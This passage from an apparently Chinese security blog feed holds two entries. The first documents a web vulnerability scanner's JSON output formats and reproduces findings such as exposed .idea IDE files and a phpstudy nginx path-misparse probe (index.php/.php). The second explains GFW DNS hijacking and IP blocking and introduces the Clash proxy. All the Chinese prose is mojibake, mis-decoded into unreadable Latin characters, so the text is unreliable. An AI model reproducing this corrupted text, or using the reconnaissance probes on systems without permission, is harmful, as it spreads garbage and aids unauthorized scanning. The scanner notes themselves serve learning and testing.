çš„å®šä¹‰ä¸º:</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-built_in">type</span> VulnDetail struct &#123;<br>    Addr     <span class="hljs-built_in">string</span>                 `json:<span class="hljs-string">&quot;addr&quot;</span> yam<span class="hljs-variable">l:</span><span class="hljs-string">&quot;addr&quot;</span>`<br>    Payload  <span class="hljs-built_in">string</span>                 `json:<span class="hljs-string">&quot;payload&quot;</span> yam<span class="hljs-variable">l:</span><span class="hljs-string">&quot;payload&quot;</span>`<br>    SnapShot []interface&#123;&#125;          `json:<span class="hljs-string">&quot;snapshot&quot;</span> yam<span class="hljs-variable">l:</span><span class="hljs-string">&quot;snapshot&quot;</span>`<br>    Extra    <span class="hljs-keyword">map</span>[<span class="hljs-built_in">string</span>]interface&#123;&#125; `json:<span class="hljs-string">&quot;extra&quot;</span> yam<span class="hljs-variable">l:</span><span class="hljs-string">&quot;extra&quot;</span>`<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="webç»Ÿè®¡ä¿¡æ¯"><a href="#webç»Ÿè®¡ä¿¡æ¯" class="headerlink" title="webç»Ÿè®¡ä¿¡æ¯"></a>webç»Ÿè®¡ä¿¡æ¯</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;web_statistic&quot;</span>,<br>  <span class="hljs-attr">&quot;data&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;num_found_urls&quot;</span>: <span class="hljs-number">1</span>,<br>    <span class="hljs-attr">&quot;num_scanned_urls&quot;</span>: <span class="hljs-number">1</span>,<br>    <span class="hljs-attr">&quot;num_sent_http_requests&quot;</span>: <span class="hljs-number">3</span>,<br>    <span class="hljs-attr">&quot;average_response_time&quot;</span>: <span class="hljs-number">0</span>,<br>    <span class="hljs-attr">&quot;ratio_failed_http_requests&quot;</span>: <span class="hljs-number">0</span>,<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>num_found_urls</code> å‘ç°çš„æ‰«æç›®æ ‡æ•°é‡</li><li><code>num_scanned_urls</code> å·²æ‰«æå®Œæˆçš„æ‰«æç›®æ ‡æ•°é‡</li><li><code>num_sent_http_requests</code> å·²ç»å‘å‡ºçš„æ¼æ´æ¢æµ‹è¯·æ±‚æ•°é‡</li><li><code>average_response_time</code> è¿‘ 30s è¯·æ±‚å¹³å‡å“åº”æ—¶é—´</li><li><code>ratio_failed_http_requests</code> è¿‘ 30s è¯·æ±‚å¤±è´¥ç‡</li></ul><p>è¿™äº›ä¿¡æ¯é™¤äº†è¡¨é¢æ„æ€ï¼Œè¿˜æœ‰å…¶ä»–éšè—å«ä¹‰ï¼š</p><ul><li>pending çš„æ•°é‡ç­‰äº <code>num_found_urls</code> - <code>num_scanned_urls</code>, å¦‚æœ pending = 0ï¼Œé‚£ä¹ˆå°±æ„å‘³ç€æ‰«æå®Œæˆäº†</li><li><code>average_response_time</code> æ¯”è¾ƒé«˜ (&gt;200ms) æ„å‘³ç€ç½‘ç»œå»¶è¿Ÿæ¯”è¾ƒå¤§</li><li><code>ratio_failed_http_requests</code> æ¯”è¾ƒé«˜(&gt;5%) æ„å‘³ç€å¯èƒ½æœ‰ waf, åæ­£å°±æ˜¯å¾ˆå¤šè¯·æ±‚å¤±è´¥äº†</li></ul><h3 id="å­åŸŸåæ¶ˆæ¯æ ¼å¼"><a href="#å­åŸŸåæ¶ˆæ¯æ ¼å¼" class="headerlink" title="å­åŸŸåæ¶ˆæ¯æ ¼å¼"></a>å­åŸŸåæ¶ˆæ¯æ ¼å¼</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;subdomain&quot;</span>,<br>  <span class="hljs-attr">&quot;data&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;cname&quot;</span>: [],<br>    <span class="hljs-attr">&quot;domain&quot;</span>: <span class="hljs-string">&quot;example.com&quot;</span>,<br>    <span class="hljs-attr">&quot;extra&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-attr">&quot;ip&quot;</span>: [<br>      &#123;<br>        <span class="hljs-attr">&quot;asn&quot;</span>: <span class="hljs-string">&quot;EDGECAST (ASN15133)&quot;</span>,<br>        <span class="hljs-attr">&quot;country&quot;</span>: <span class="hljs-string">&quot;åŒ—ç¾æ´² ç¾å›½&quot;</span>,<br>        <span class="hljs-attr">&quot;ip&quot;</span>: <span class="hljs-string">&quot;93.184.216.34&quot;</span><br>      &#125;,<br>      &#123;<br>        <span class="hljs-attr">&quot;asn&quot;</span>: <span class="hljs-string">&quot;EDGECAST (ASN15133)&quot;</span>,<br>        <span class="hljs-attr">&quot;country&quot;</span>: <span class="hljs-string">&quot;åŒ—ç¾æ´² ç¾å›½&quot;</span>,<br>        <span class="hljs-attr">&quot;ip&quot;</span>: <span class="hljs-string">&quot;2606:2800:220:1:248:1893:25c8:1946&quot;</span><br>      &#125;<br>    ],<br>    <span class="hljs-attr">&quot;parent&quot;</span>: <span class="hljs-string">&quot;example.com&quot;</span>,<br>    <span class="hljs-attr">&quot;verbose_name&quot;</span>: <span class="hljs-string">&quot;initial&quot;</span>,<br>    <span class="hljs-attr">&quot;web&quot;</span>: [<br>      &#123;<br>        <span class="hljs-attr">&quot;link&quot;</span>: <span class="hljs-string">&quot;http://example.com/&quot;</span>,<br>        <span class="hljs-attr">&quot;server&quot;</span>: <span class="hljs-string">&quot;ECS (sjc/4FB8)&quot;</span>,<br>        <span class="hljs-attr">&quot;status&quot;</span>: <span class="hljs-number">200</span>,<br>        <span class="hljs-attr">&quot;title&quot;</span>: <span class="hljs-string">&quot;Example Domain&quot;</span><br>      &#125;,<br>      &#123;<br>        <span class="hljs-attr">&quot;link&quot;</span>: <span class="hljs-string">&quot;https://example.com/&quot;</span>,<br>        <span class="hljs-attr">&quot;server&quot;</span>: <span class="hljs-string">&quot;ECS (sjc/4E8D)&quot;</span>,<br>        <span class="hljs-attr">&quot;status&quot;</span>: <span class="hljs-number">200</span>,<br>        <span class="hljs-attr">&quot;title&quot;</span>: <span class="hljs-string">&quot;Example Domain&quot;</span><br>      &#125;<br>    ]<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="VulnTypeå¤§ç±»å¤ç°"><a href="#VulnTypeå¤§ç±»å¤ç°" class="headerlink" title="VulnTypeå¤§ç±»å¤ç°"></a>VulnTypeå¤§ç±»å¤ç°</h2><h3 id="Server-error"><a href="#Server-error" class="headerlink" title="Server-error"></a>Server-error</h3><p><img src="Snipaste_2021-03-09_21-01-20.png" alt=""></p><p>ä½¿ç”¨bpçš„Repeaterï¼Œè®¾ç½®ç›®æ ‡å¤åˆ¶Requestå³å¯ã€‚ç”±äºæ˜¯æ¦‚ç‡å¼•å‘errorï¼Œå¤šæ¬¡åˆ·æ–°æ‰è¡Œã€‚<br><img src="Snipaste_2021-03-09_20-58-41.png" alt=""></p><h3 id="crossdomain"><a href="#crossdomain" class="headerlink" title="crossdomain"></a>crossdomain</h3><p><img src="Snipaste_2021-03-09_21-07-40.png" alt=""></p><h3 id="config-ide"><a href="#config-ide" class="headerlink" title="config/ide"></a>config/ide</h3><p><img src="Snipaste_2021-03-12_08-42-08.png" alt=""></p><p>å…¶ä¸­ï¼ŒFileEditorManageråŒ…å«æ–‡ä»¶ååŠç›¸å¯¹è·¯å¾„</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;component <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;FileEditorManager&quot;</span>&gt;<br> <span class="hljs-built_in">..</span>.<br>&lt;file <span class="hljs-attribute">leaf-file-name</span>=<span class="hljs-string">&quot;cart.php&quot;</span> <span class="hljs-attribute">pinned</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attribute">current</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attribute">current-in-tab</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;<br>&lt;entry <span class="hljs-attribute">file</span>=<span class="hljs-string">&quot;file://<span class="hljs-variable">$PROJECT_DIR</span>$/cart.php&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p>Git.SettingsåŒ…å«Gitçš„ä¸€äº›è®¾ç½®</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">&lt;component <span class="hljs-type">name</span>=&quot;Git.Settings&quot;&gt;<br>  &lt;<span class="hljs-keyword">option</span> <span class="hljs-type">name</span>=&quot;CHECKOUT_INCLUDE_TAGS&quot; <span class="hljs-keyword">value</span>=&quot;false&quot;/&gt;<br>  &lt;<span class="hljs-keyword">option</span> <span class="hljs-type">name</span>=&quot;UPDATE_CHANGES_POLICY&quot; <span class="hljs-keyword">value</span>=&quot;STASH&quot;/&gt;<br>  &lt;<span class="hljs-keyword">option</span> <span class="hljs-type">name</span>=&quot;LINE_SEPARATORS_CONVERSION&quot; <span class="hljs-keyword">value</span>=&quot;ASK&quot;/&gt;<br>&lt;/component&gt;<br></code></pre></td></tr></table></figure><p>ideæ–‡ä»¶å†å²è®°å½•</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">component</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;IdeDocumentHistory&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;changedFiles&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">list</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$PROJECT_DIR$/.htaccess&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$PROJECT_DIR$/cart.php&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">list</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">component</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ä¿®æ”¹å†å²è®°å½•</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">component</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ChangeListManager&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">list</span> <span class="hljs-attr">default</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;190e5f86-a42c-4cc9-a03a-80ac0d47d6d2&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Default&quot;</span> <span class="hljs-attr">comment</span>=<span class="hljs-string">&quot;&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">ignored</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;acuart.iws&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">ignored</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;.idea/workspace.xml&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;TRACKING_ENABLED&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;true&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;SHOW_DIALOG&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;false&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;HIGHLIGHT_CONFLICTS&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;true&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;HIGHLIGHT_NON_ACTIVE_CHANGELIST&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;false&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;LAST_RESOLUTION&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;IGNORE&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">component</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">component</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;editorHistoryManager&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">entry</span> <span class="hljs-attr">file</span>=<span class="hljs-string">&quot;file://$PROJECT_DIR$/.htaccess&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">provider</span> <span class="hljs-attr">selected</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">editor-type-id</span>=<span class="hljs-string">&quot;text-editor&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">state</span> <span class="hljs-attr">line</span>=<span class="hljs-string">&quot;6&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;0&quot;</span> <span class="hljs-attr">selection-start</span>=<span class="hljs-string">&quot;213&quot;</span> <span class="hljs-attr">selection-end</span>=<span class="hljs-string">&quot;222&quot;</span> <span class="hljs-attr">vertical-scroll-proportion</span>=<span class="hljs-string">&quot;0.124847&quot;</span>&gt;</span><br>...<br><span class="hljs-tag">&lt;<span class="hljs-name">entry</span> <span class="hljs-attr">file</span>=<span class="hljs-string">&quot;file://$PROJECT_DIR$/cart.php&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">provider</span> <span class="hljs-attr">selected</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">editor-type-id</span>=<span class="hljs-string">&quot;text-editor&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">state</span> <span class="hljs-attr">line</span>=<span class="hljs-string">&quot;60&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;26&quot;</span> <span class="hljs-attr">selection-start</span>=<span class="hljs-string">&quot;2336&quot;</span> <span class="hljs-attr">selection-end</span>=<span class="hljs-string">&quot;2336&quot;</span> <span class="hljs-attr">vertical-scroll-proportion</span>=<span class="hljs-string">&quot;-0.41645244&quot;</span>&gt;</span><br><br>...<br><span class="hljs-tag">&lt;/<span class="hljs-name">component</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="poc-yaml-phpstudy-nginx-wrong-resolve"><a href="#poc-yaml-phpstudy-nginx-wrong-resolve" class="headerlink" title="poc-yaml-phpstudy-nginx-wrong-resolve"></a>poc-yaml-phpstudy-nginx-wrong-resolve</h3><p>è¯·æ±‚äº†</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-number">94561621.</span>php<br><span class="hljs-keyword">index</span>.php<br><span class="hljs-keyword">index</span>.php/.php<br><span class="hljs-keyword">index</span>.php/.xxx<br></code></pre></td></tr></table></figure><p>åªæœ‰<code>index.php</code>å’Œ<code>index.php/.php</code>è¯·æ±‚æˆåŠŸäº†ï¼Œå¹¶ä¸”éƒ½è¿”å›çš„æ˜¯index.phpçš„é¡µé¢ã€‚ä½†ç”±äºç½‘é¡µä½¿ç”¨ç›¸å¯¹è·¯å¾„åŠ è½½å›¾ç‰‡ï¼Œæ‰€ä»¥åœ¨<code>index.php/.php</code>æ—¶å›¾ç‰‡éƒ½æ— æ³•æ­£å¸¸åŠ è½½ã€‚</p><p><img src="Snipaste_2021-03-12_09-12-46.png" alt=""></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ä½ è®¿é—®è°·æ­Œæ—¶ï¼Œéƒ½å‘ç”Ÿäº†å•¥</title>
    <link href="/2021/02/12/%E4%BD%A0%E8%AE%BF%E9%97%AE%E8%B0%B7%E6%AD%8C%E6%97%B6%EF%BC%8C%E9%83%BD%E5%8F%91%E7%94%9F%E4%BA%86%E5%95%A5/"/>
    <url>/2021/02/12/%E4%BD%A0%E8%AE%BF%E9%97%AE%E8%B0%B7%E6%AD%8C%E6%97%B6%EF%BC%8C%E9%83%BD%E5%8F%91%E7%94%9F%E4%BA%86%E5%95%A5/</url>
    
    <content type="html"><![CDATA[<h2 id="å…è´£å£°æ˜"><a href="#å…è´£å£°æ˜" class="headerlink" title="å…è´£å£°æ˜"></a>å…è´£å£°æ˜</h2><p>æ­¤æ–‡ç« é’ˆå¯¹å­¦æ ¡èŒæ–°ï¼Œå¦‚æœ‰é”™è¯¯è¿˜è¯·æŒ‡æ•™ã€‚ä»…å‡ºäºæ•™è‚²ç§‘æ™®æ„ä¹‰ï¼Œä¸æ˜¯ä¸ºäº†æŒ‡å¼•ã€‚éµå®ˆç½‘ç»œå®‰å…¨æ³•ï¼Œå®ˆæ³•é’å¹´ï¼Œä»æˆ‘åšèµ·ã€‚</p><hr><p>å½“ä½ è®¿é—®è°·æ­Œçš„æ—¶å€™ï¼Œä½ æ˜¯å¦æƒ³è¿‡ä¸ºä»€ä¹ˆä¼šæ— æ³•æ‰“å¼€è°·æ­Œï¼Ÿä½ ä¹Ÿå¯èƒ½å¬è¯´è¿‡GFW é˜²ç«å¢™ï¼Œä¸‹é¢å°±æ¥æ¢ç´¢ä¸€ç•ªå­ã€‚</p><h2 id="ä»€ä¹ˆæ˜¯é˜²ç«å¢™"><a href="#ä»€ä¹ˆæ˜¯é˜²ç«å¢™" class="headerlink" title="ä»€ä¹ˆæ˜¯é˜²ç«å¢™"></a>ä»€ä¹ˆæ˜¯é˜²ç«å¢™</h2><p>å¯ä»¥å½“ä½œä¸€ä¸ªåœ¨ç½‘ç»œå‡ºå…¥å£ï¼Œè´Ÿè´£è¿‡æ»¤æ‰€æœ‰æ•°æ®åŒ…ã€ç½‘ç»œè¯·æ±‚çš„ç”µè„‘ã€‚é‡Œé¢è¦è®¿é—®å¤–é¢çš„ç½‘ç«™éƒ½è¦ç»è¿‡è¿™é‡Œï¼ŒåŒç†ï¼Œå¤–é¢è®¿é—®é‡Œé¢çš„ç½‘ç«™ç­‰ä¹Ÿè¦ç»è¿‡è¿™é‡Œã€‚çœ‹åˆ°è¿™é‡Œï¼Œèªæ˜çš„å°ä¼™ä¼´åº”è¯¥å°±çŒœåˆ°äº†ï¼Œæˆ‘ä»¬è®¿é—®è°·æ­Œç­‰ï¼ŒåŸºæœ¬å°±æ˜¯è¿‡ä¸å»è¿™ä¸ªåå„¿ã€‚</p><h2 id="ä»€ä¹ˆæ³•å­ï¼Œæ‹¦ä½äº†æˆ‘ä»¬"><a href="#ä»€ä¹ˆæ³•å­ï¼Œæ‹¦ä½äº†æˆ‘ä»¬" class="headerlink" title="ä»€ä¹ˆæ³•å­ï¼Œæ‹¦ä½äº†æˆ‘ä»¬"></a>ä»€ä¹ˆæ³•å­ï¼Œæ‹¦ä½äº†æˆ‘ä»¬</h2><p>pingè°·æ­Œ</p><img src="/2021/02/12/%E4%BD%A0%E8%AE%BF%E9%97%AE%E8%B0%B7%E6%AD%8C%E6%97%B6%EF%BC%8C%E9%83%BD%E5%8F%91%E7%94%9F%E4%BA%86%E5%95%A5/Snipaste_2021-02-12_04-06-08.png" class=""><p>å¯ä»¥çœ‹åˆ°ï¼Œå¤šæ¬¡pingä¹‹åè¿”å›äº†ä¸åŒçš„ipï¼Œä½†è¿™ä¸¤ä¸ªéƒ½ä¸åœ¨ <a href="https://www.gstatic.com/ipranges/goog.json">è°·æ­Œå…¬å¸ƒçš„ipèŒƒå›´</a>å†…ã€‚é‚£ä¹ˆï¼Œæœ€èµ·ç çš„ï¼Œ<strong>DNSåŠ«æŒ</strong>æ˜¯æœ‰çš„äº†ã€‚ï¼ˆ<a href="https://baike.baidu.com/item/%E5%9F%9F%E5%90%8D%E7%B3%BB%E7%BB%9F/2251573?fromtitle=DNS&fromid=427444&fr=aladdin">DNSæ˜¯ä»€ä¹ˆè¯·ç‚¹æˆ‘</a>ï¼‰ä»–è¿”å›ä¸€ä¸ªé”™è¯¯çš„ipåœ°å€ç»™ä½ ï¼Œå³å¦‚ä¸Šæ‰€è§ä¸€æ ·ã€‚</p><p>æˆ‘ä»¬åœ¨ <a href="https://myssl.com/dns_check.html">åœ¨çº¿dnså·¥å…·</a>æŸ¥è¯¢å¯å¾—å¦‚å›¾ç»“æœ</p><img src="/2021/02/12/%E4%BD%A0%E8%AE%BF%E9%97%AE%E8%B0%B7%E6%AD%8C%E6%97%B6%EF%BC%8C%E9%83%BD%E5%8F%91%E7%94%9F%E4%BA%86%E5%95%A5/Snipaste_2021-02-12_04-22-50.png" class=""><p>å¹¶ç»æˆ‘è¿™æµ‹è¯•ï¼Œé€‰æ‹©çš„ipæ˜¯å¯ä»¥ç›´æ¥è®¿é—®æ‰“å¼€Google.comçš„ã€‚é‚£ä¹ˆçœ‹çœ‹ç½‘ç»œè®¿é—®æƒ…å†µå¦‚ä½•å­</p><img src="/2021/02/12/%E4%BD%A0%E8%AE%BF%E9%97%AE%E8%B0%B7%E6%AD%8C%E6%97%B6%EF%BC%8C%E9%83%BD%E5%8F%91%E7%94%9F%E4%BA%86%E5%95%A5/Snipaste_2021-02-12_04-24-12.png" class=""><p>å¯ä»¥çœ‹åˆ°ï¼Œç›´æ¥pingä¹Ÿæ˜¯ä¸é€šçš„ã€‚é‚£ä½¿ç”¨<code>tracert</code>æ¥è·Ÿè¸ªè·¯ç”±ï¼ˆ<a href="https://baike.baidu.com/item/TRACERT%E5%91%BD%E4%BB%A4/7680170?fr=aladdin">TRACERTå‘½ä»¤_ç™¾åº¦ç™¾ç§‘ (baidu.com)</a>ï¼‰ã€‚å¯ä»¥çœ‹åˆ°è·³ç€è·³ç€ï¼Œå°±ç›´æ¥è¶…æ—¶äº†ã€‚é‚£ä¹ˆä¹Ÿå¯ä»¥çŒœåˆ°ï¼ŒGFWå¯¹äºè¿™ä¸ªipï¼Œæ˜¯å°ç¦æ‰äº†ã€‚ä¸€çœ‹åˆ°ç›®çš„ipæ˜¯è¿™ä¸ªï¼Œå°±ç›´æ¥å°†æ•°æ®åŒ…ä¸¢å¼ƒäº†ï¼Œå¯¹äºæˆ‘ä»¬è¿™é‡Œä¹Ÿå°±è¶…æ—¶äº†ã€‚é‚£ä¹ˆï¼Œ<strong>IPå°ç¦</strong>ï¼Œä¹Ÿæ˜¯æœ‰äº†ã€‚</p><p>è¿˜æœ‰ä¸ªç½‘ä¼ çš„å†…å®¹å®¡æŸ¥ï¼Œæˆ‘å°±ä¸æµ‹è¯•äº†ï¼Œæœ¬è´¨æ˜¯æŸ¥è¯¢æ•°æ®åŒ…å†…å®¹ï¼Œæœ‰å°ç¦å…³é”®å­—åˆ™æŠŠä½ çš„é“¾æ¥æ–­æ‰ã€‚è¿™åœ¨httpæ—¶å¯è¡Œï¼Œå› ä¸ºåŸºæœ¬éƒ½æ˜¯æ˜æ–‡çš„ã€‚ä½†æ˜¯åˆ°äº†httpsï¼Œæˆ‘ä¸ªäººæ„Ÿè§‰æ˜¯ä¸å¯è¡Œäº†ã€‚<a href="https://www.svlik.com/1804.html#:~:text=GFW%EF%BC%8C%E5%8D%B3Great%20Wall%20of,%E7%94%A8%E6%88%B7%E8%AE%BF%E9%97%AE%E5%9B%BD%E5%86%85%E7%9A%84%E7%AB%99%E7%82%B9%E3%80%82">è¯¦ç»†å¯çœ‹è¿™é‡Œ</a></p><h2 id="æˆ‘ä»¬èƒ½æ€ä¹ˆè¿‡å»"><a href="#æˆ‘ä»¬èƒ½æ€ä¹ˆè¿‡å»" class="headerlink" title="æˆ‘ä»¬èƒ½æ€ä¹ˆè¿‡å»"></a>æˆ‘ä»¬èƒ½æ€ä¹ˆè¿‡å»</h2><p>æ—¢ç„¶é’ˆå¯¹äº†ipå’Œdnsè¿›è¡Œäº†ï¼Œé‚£æˆ‘ä»¬çš„åŠæ³•å³ä¸ºå¦‚ä½•ç»•è¿‡ã€‚è¿™å°±åƒä½ åœ¨å­¦æ ¡é‡Œé¢ï¼Œå­¦æ ¡é’ˆå¯¹ ç‹è€…çš„æœåŠ¡å™¨çš„ipå’Œdnsè¿›è¡Œäº†å°ç¦ã€‚ä¸ºäº†èƒ½ç»§ç»­ç©æ¸¸æˆï¼Œå°±æœ‰äººå¼€åŠ¨è„‘ç­‹ï¼šæˆ‘åœ¨å­¦æ ¡æ²¡æœ‰å°ç¦çš„å…¬ç½‘æœåŠ¡å™¨ä¸Šåšä¸€ä¸ªè·³æ¿ï¼Œä»è¿™é‡Œèµ°ï¼Œå°±ç»•å¼€äº†å­¦æ ¡çš„å°ç¦äº†$^1$ã€‚åˆæœ‰äººï¼Œå¯¹æˆ‘ä»¬çš„æ•°æ®åŒ…è¿›è¡ŒåŠ å¯†ï¼Œè®©å­¦æ ¡çš„é˜²ç«å¢™æ‰“å¼€æ•°æ®åŒ…ï¼Œæ¨ªç«–éƒ½çœ‹ä¸å‡ºä½ æ˜¯å‘ç»™ç‹è€…æœåŠ¡å™¨çš„ï¼Œé‚£è‡ªç„¶ä¹Ÿæ”¾è¡Œäº†$^2$ã€‚è¿˜æœ‰ä¸€ç§æ˜¯ï¼Œè‚‰èº«å‡ºå›½ï¼ˆè¯¯</p><p>åŸºæœ¬ä¸Šï¼Œä½ å»æ‰¾äººå®¶ï¼Œè¯´ä½ è¦ç»•è¿‡é˜²ç«å¢™æ¥ç©ç‹è€…ï¼Œåˆ«äººå°±ä¼šç§’æ‡‚ï¼Œå•ªçš„ä¸€ä¸‹ç»™ä½ ä¸€å¤§å †é“¾æ¥ï¼Œå†ç»™ä½ ä¸€ä¸ªè®¢é˜…é“¾æ¥ã€‚</p><p>è¿™é‡Œä»‹ç»ä¸€ä¸ªè½¯ä»¶ï¼Œclash <a href="https://github.com/Fndroid/clash_for_windows_pkg">clash_for_windows_pkg: A Windows/macOS GUI based on Clash</a> åªè¦ä½ çš„ä¸Šå®¶ç»™ä½ çš„é“¾æ¥åŒ…æ‹¬äº†åˆ†æµè§„åˆ™ï¼ˆä¹Ÿå°±æ˜¯ï¼Œæ­£å¸¸çš„æ­£å¸¸èµ°ï¼Œä¸æ­£å¸¸çš„è·³ç€èµ°ï¼Œä»è·³æ¿èµ°ï¼‰ï¼Œè¿™é‡Œå°±ä¼šè‡ªåŠ¨çš„å¸®ä½ åˆ†æµæµé‡ã€‚</p><p>å…ˆ</p><img src="/2021/02/12/%E4%BD%A0%E8%AE%BF%E9%97%AE%E8%B0%B7%E6%AD%8C%E6%97%B6%EF%BC%8C%E9%83%BD%E5%8F%91%E7%94%9F%E4%BA%86%E5%95%A5/Snipaste_2021-02-12_04-45-54.png" class=""><p>URLè¿™é‡Œç²˜è´´è¿›å»ä½ çš„é“¾æ¥ï¼Œç„¶åç‚¹downloadï¼Œä¸‹è½½å¥½åç‚¹ä¸€ä¸‹ä¸‹æ–¹çš„æ¡†æ¡†ã€‚</p><p>æ¥ä¸‹æ¥</p><img 